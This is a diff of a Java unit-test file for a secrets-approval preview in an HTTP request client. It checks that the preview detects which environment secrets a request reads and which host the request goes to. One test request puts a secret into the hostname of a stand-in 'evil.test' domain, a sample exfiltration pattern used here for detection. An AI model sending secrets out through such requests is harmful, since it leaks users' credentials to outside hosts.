@@ -16,7 +16,7 @@ import static org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 /**
- * The dry resolution the secrets gate asks from ({@link HttpClientService#preview}): it records exactly the secret
+ * The dry resolution the secrets gate asks from ({@link SecretApproval#preview}): it records exactly the secret
  * sources a send reads, whatever the form or the indirection, keeps their values out of what it returns, and
  * names the host the request goes to. {@code PATH} stands in for a secret: every platform has it.
  */
@@ -28,8 +28,8 @@ class HttpSecretPreviewTest {
         return HttpFile.parseRequest(HttpFile.parse(text).get(0));
     }
 
-    private static HttpClientService.Preview preview(String text) {
-        return HttpClientService.preview(request(text), Map.of(), null, null);
+    private static SecretApproval.Preview preview(String text) {
+        return SecretApproval.preview(request(text), Map.of(), null, null);
     }
 
     @Test
@@ -89,8 +89,7 @@ class HttpSecretPreviewTest {
         assertEquals(
                 List.of(), preview("@a = {{$env PATH}}\nGET http://h.test/\n").reads(), "declared, never used");
         Map<String, String> env = Map.of("a", "{{$processEnv PATH}}", "b", "{{a}}/x", "unused", "{{$dotenv K}}");
-        HttpClientService.Preview p =
-                HttpClientService.preview(request("GET http://h.test/?k={{b}}\n"), env, null, null);
+        SecretApproval.Preview p = SecretApproval.preview(request("GET http://h.test/?k={{b}}\n"), env, null, null);
         assertEquals(List.of("$processEnv PATH"), p.reads());
     }
 
@@ -98,10 +97,10 @@ class HttpSecretPreviewTest {
     void substitutedBodyFilesAndMultipartPartsAreRead(@TempDir Path dir) throws Exception {
         Files.writeString(dir.resolve("body.txt"), "k={{$env PATH}}");
         Files.writeString(dir.resolve("part.txt"), "secret={{$processEnv PATH}}");
-        HttpClientService.Preview body = HttpClientService.preview(
+        SecretApproval.Preview body = SecretApproval.preview(
                 request("POST http://h.test/\nContent-Type: text/plain\n\n<@ ./body.txt\n"), Map.of(), dir, null);
         assertEquals(List.of("$env PATH"), body.reads());
-        HttpClientService.Preview part = HttpClientService.preview(
+        SecretApproval.Preview part = SecretApproval.preview(
                 request("POST http://h.test/\nContent-Type: multipart/form-data; boundary=b\n\n--b\n"
                         + "Content-Disposition: form-data; name=\"f\"\n\n<@ ./part.txt\n--b--\n"),
                 Map.of(),
@@ -119,11 +118,11 @@ class HttpSecretPreviewTest {
         assertEquals(
                 List.of("api.test:8080"),
                 preview("GET /x?k={{$env PATH}}\nHost: api.test:8080\n").hosts());
-        HttpClientService.Preview inHost = preview("GET http://{{$env PATH}}.evil.test/\n");
+        SecretApproval.Preview inHost = preview("GET http://{{$env PATH}}.evil.test/\n");
         assertEquals(List.of("$env PATH"), inHost.reads());
         assertFalse(inHost.hosts().get(0).contains(SECRET), inHost.hosts().toString());
         assertEquals("{{$env PATH}}.evil.test", inHost.hosts().get(0));
-        assertEquals("h.test", HttpClientService.hostOf("https://user:pw@h.test/p?q#f"));
+        assertEquals("h.test", HttpHosts.authority("https://user:pw@h.test/p?q#f"));
     }
 
     @Test
@@ -140,5 +139,25 @@ class HttpSecretPreviewTest {
     void pathologicalBracesAreScannedInLinearTime() {
         String text = "GET http://h.test/\nContent-Type: text/plain\n\nx {{" + " ".repeat(200_000) + "\n";
         assertTimeoutPreemptively(java.time.Duration.ofSeconds(5), () -> preview(text));
+    }
+
+    @Test
+    void thePreviewSaysWhetherTheRequestIsSentAndWhetherItsHostIsKnownBeforehand() {
+        SecretApproval.Preview plain = preview("GET http://h.test/?k={{$env PATH}}\n");
+        assertTrue(plain.sendable());
+        assertFalse(plain.hostFromResponse());
+        assertFalse(plain.hostUnfixed());
+        assertFalse(
+                preview("GRAPHQL http://h.test/?k={{$env PATH}}\n\nquery { a }\n")
+                        .sendable(),
+                "never sent");
+        SecretApproval.Preview chained =
+                preview("@base = {{login.response.body.$.next}}\nGET {{base}}?k={{$env PATH}}\n");
+        assertTrue(chained.hostFromResponse(), "a host an earlier response chooses, through an @var line");
+        assertTrue(chained.hostUnfixed());
+        assertTrue(preview("GET http://{{$env HOST}}/?k=1\n").hostUnfixed(), "a host made of a secret");
+        assertTrue(
+                preview("GET /p\nHost: {{$random.alphabetic(5)}}.h.test\n").hostUnfixed(), "a fresh value each time");
+        assertFalse(preview("GET http://h.test/{{login.response.body.$.id}}\n").hostUnfixed(), "only the path");
     }
 }
